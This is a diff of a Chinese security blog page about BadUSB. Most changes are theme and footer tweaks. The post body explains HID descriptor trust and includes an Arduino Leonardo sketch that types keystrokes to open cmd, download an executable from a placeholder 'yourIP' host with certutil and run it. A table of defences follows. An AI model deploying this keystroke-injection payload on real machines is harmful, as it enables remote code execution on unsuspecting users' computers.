@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="0x00 锲子这篇博文缘起公司一位单片机dalao的月末技术分享，当时觉得是挺有意思的，顺带着自己目前的研究方向又是偏向硬件（无线）、协议这一块，又恰好之前公司接了一家公司的授权实地渗透，当时有想法是就是扔badusb（捂脸），这边仅记录下学习过程。">
@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://driverxdw.github.io/2019/10/22/BadUsb%E4%BB%8E%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%88%B0%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/5.png">
 <meta property="article:published_time" content="2019-10-22T15:58:39.000Z">
 <meta property="article:modified_time" content="2020-07-06T02:08:50.265Z">
-<meta property="article:author" content="xdw">
+<meta property="article:author" content="XDW">
 <meta property="article:tag" content="硬件">
 <meta property="article:tag" content="无线">
 <meta name="twitter:card" content="summary">
@@ -151,29 +151,9 @@
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>
 
   </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">30</span></a>
-
-  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">56</span></a>
-
-  </li>
-        <li class="menu-item menu-item-schedule">
-
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
-
-  </li>
-        <li class="menu-item menu-item-sitemap">
-
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
-
-  </li>
-        <li class="menu-item menu-item-commonweal">
-
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -211,7 +191,9 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xdw</p>
+    <img class="site-author-image" itemprop="image" alt="XDW"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">XDW</p>
   <div class="site-description" itemprop="description">一枚很菜但是仍在学习的二进制菜逼</div>
 </div>
 <div class="site-state-wrap animated">
@@ -225,7 +207,6 @@
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-          
         <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
@@ -239,6 +220,16 @@
 </div>
 
 
+  <div class="links-of-blogroll animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ixuchao.cn/" title="https:&#x2F;&#x2F;blog.ixuchao.cn&#x2F;" rel="noopener" target="_blank">Archerx's Blog</a>
+        </li>
+    </ul>
+  </div>
 
       </section>
     </div>
@@ -271,8 +262,8 @@
     <link itemprop="mainEntityOfPage" href="https://driverxdw.github.io/2019/10/22/BadUsb%E4%BB%8E%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%88%B0%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xdw">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="XDW">
       <meta itemprop="description" content="一枚很菜但是仍在学习的二进制菜逼">
     </span>
 
@@ -306,6 +297,13 @@
       </span>
 
   
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
 </div>
 
         </div>
@@ -315,7 +313,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <html><head></head><body><h2 id="0x00-锲子"><a href="#0x00-锲子" class="headerlink" title="0x00 锲子"></a>0x00 锲子</h2><p>这篇博文缘起公司一位单片机dalao的月末技术分享，当时觉得是挺有意思的，顺带着自己目前的研究方向又是偏向硬件（无线）、协议这一块，又恰好之前公司接了一家公司的授权实地渗透，当时有想法是就是扔badusb（捂脸），这边仅记录下学习过程。</p>
+        <h2 id="0x00-锲子"><a href="#0x00-锲子" class="headerlink" title="0x00 锲子"></a>0x00 锲子</h2><p>这篇博文缘起公司一位单片机dalao的月末技术分享，当时觉得是挺有意思的，顺带着自己目前的研究方向又是偏向硬件（无线）、协议这一块，又恰好之前公司接了一家公司的授权实地渗透，当时有想法是就是扔badusb（捂脸），这边仅记录下学习过程。</p>
 <a id="more"></a>
 
 
@@ -329,9 +327,9 @@
 </ul>
 <h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul>
 <li><p>主机是通过设备固件中的某些描述符来判断USB哪种设备的。这就意味着我们可以利用此漏洞将一些特殊的USB设备伪装成为其他任何设备，例如输入设备、网卡等等。</p>
-<p><img src="./1.png" alt></p>
+<p><img src="./1.png" alt=""></p>
 <p>当插入USB设备后，主机驱动会向设备请求各种描述符来识别设备，为了把一个设备识别成HID类别，设备固件在定义描述符的时候必须遵守HID规约。</p>
-<p><img src="./2.png" alt></p>
+<p><img src="./2.png" alt=""></p>
 </li>
 </ul>
 <h3 id="构成："><a href="#构成：" class="headerlink" title="构成："></a>构成：</h3><ul>
@@ -344,20 +342,20 @@
 <h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><ul>
 <li>BadUSB插入后，可以模拟键盘、鼠标等设备对电脑进行操作，例如通过这些操作打开电脑的命令终端，并执行恶意命令，从指定网址下载其他代码并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</li>
 </ul>
-<h2 id="0x04-攻击代码-amp-演示"><a href="#0x04-攻击代码-amp-演示" class="headerlink" title="0x04 攻击代码&演示"></a>0x04 攻击代码&演示</h2><h3 id="贴下实物："><a href="#贴下实物：" class="headerlink" title="贴下实物："></a>贴下实物：</h3><p> 这边买的是某宝上制成U盘模样的Arduino Leonardo，50RMB左右就能入手一块了，恶意代码可以用Arduino进行烧录</p>
-<p><img src="./6.png" alt> </p>
+<h2 id="0x04-攻击代码-amp-演示"><a href="#0x04-攻击代码-amp-演示" class="headerlink" title="0x04 攻击代码&amp;演示"></a>0x04 攻击代码&amp;演示</h2><h3 id="贴下实物："><a href="#贴下实物：" class="headerlink" title="贴下实物："></a>贴下实物：</h3><p> 这边买的是某宝上制成U盘模样的Arduino Leonardo，50RMB左右就能入手一块了，恶意代码可以用Arduino进行烧录</p>
+<p><img src="./6.png" alt=""> </p>
 <h3 id="贴下代码："><a href="#贴下代码：" class="headerlink" title="贴下代码："></a>贴下代码：</h3><p>这边贴的是一个最简单的cmd远端下载恶意文件执行，因为只是为了解原理，所以没有加绕杀软uac的代码:</p>
-<figure class="highlight arduino hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string"><Keyboard.h></span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>{</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">begin</span>();<span class="hljs-comment">//开始键盘通讯</span></span><br><span class="line"><span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//延时</span></span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_LEFT_GUI);<span class="hljs-comment">//win键</span></span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(<span class="hljs-string">'r'</span>);<span class="hljs-comment">//r键</span></span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(<span class="hljs-string">'r'</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">"CMD.EXE"</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">"certutil -urlcache -split -f http://yourIP/1.EXE D:\\1.exe"</span>); <span class="hljs-comment">//服务器下载恶意文件</span></span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">"D:\\1.exe"</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">"exit"</span>);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">end</span>();<span class="hljs-comment">//结束键盘通讯</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span><span class="hljs-comment">//循环</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);<span class="comment">//延时</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">'r'</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">'r'</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"CMD.EXE"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"certutil -urlcache -split -f http://yourIP/1.EXE D:\\1.exe"</span>); <span class="comment">//服务器下载恶意文件</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"D:\\1.exe"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"exit"</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="插入BadUsb："><a href="#插入BadUsb：" class="headerlink" title="插入BadUsb："></a>插入BadUsb：</h3><p><img src="./9.jpg" alt></p>
-<h3 id="贴下getShell图片："><a href="#贴下getShell图片：" class="headerlink" title="贴下getShell图片："></a>贴下getShell图片：</h3><p><img src="./10.jpg" alt></p>
+<h3 id="插入BadUsb："><a href="#插入BadUsb：" class="headerlink" title="插入BadUsb："></a>插入BadUsb：</h3><p><img src="./9.jpg" alt=""></p>
+<h3 id="贴下getShell图片："><a href="#贴下getShell图片：" class="headerlink" title="贴下getShell图片："></a>贴下getShell图片：</h3><p><img src="./10.jpg" alt=""></p>
 <h3 id="贴下视频："><a href="#贴下视频：" class="headerlink" title="贴下视频："></a>贴下视频：</h3><p>这边贴下<a href="https://v.youku.com/v_show/id_XODQ0NzYxNDg0.html" target="_blank" rel="noopener">玄武实验室的视频链接</a></p>
 <h3 id="0x05-漏洞根源及防御对策的可行性"><a href="#0x05-漏洞根源及防御对策的可行性" class="headerlink" title="0x05 漏洞根源及防御对策的可行性"></a>0x05 漏洞根源及防御对策的可行性</h3><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><ul>
 <li>BadUsb漏洞的根源在于USB固件可以被重新编写，而由于主机对HID设备的过分信任，导致计算机无法识别当前设备是合法设备还是被改造过的设备。</li>
 </ul>
-<h3 id="防护思路-amp-缺陷："><a href="#防护思路-amp-缺陷：" class="headerlink" title="防护思路&缺陷："></a>防护思路&缺陷：</h3><table>
+<h3 id="防护思路-amp-缺陷："><a href="#防护思路-amp-缺陷：" class="headerlink" title="防护思路&amp;缺陷："></a>防护思路&amp;缺陷：</h3><table>
 <thead>
 <tr>
 <th>防护思路</th>
@@ -385,8 +383,8 @@
 <td>简单有效（但主要局限于新设备）</td>
 </tr>
 </tbody></table>
-<h2 id="0x06-学习资料"><a href="#0x06-学习资料" class="headerlink" title="0x06 学习资料"></a>0x06 学习资料</h2><p><img src="./5.png" alt></p>
-</body></html>
+<h2 id="0x06-学习资料"><a href="#0x06-学习资料" class="headerlink" title="0x06 学习资料"></a>0x06 学习资料</h2><p><img src="./5.png" alt=""></p>
+
     </div>
 
     
@@ -461,10 +459,40 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xdw</span>
+  <span class="author" itemprop="copyrightHolder">XDW</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
+
+#<div class="powered-by">
+#    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+#    <i class="fa fa-user-md"></i>
+#    <span id="busuanzi_container_site_uv">
+#        本站访客数:<span id="busuanzi_value_site_uv"></span>
+#    </span>
+#    <span class="post-meta-divider">|</span>
+#    <span id="busuanzi_container_site_pv">
+#        本站访问量<span id="busuanzi_value_site_pv"></span>
+#    </span>
+#</div>
 
     </div>
   </footer>
@@ -490,6 +518,7 @@
 
 
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
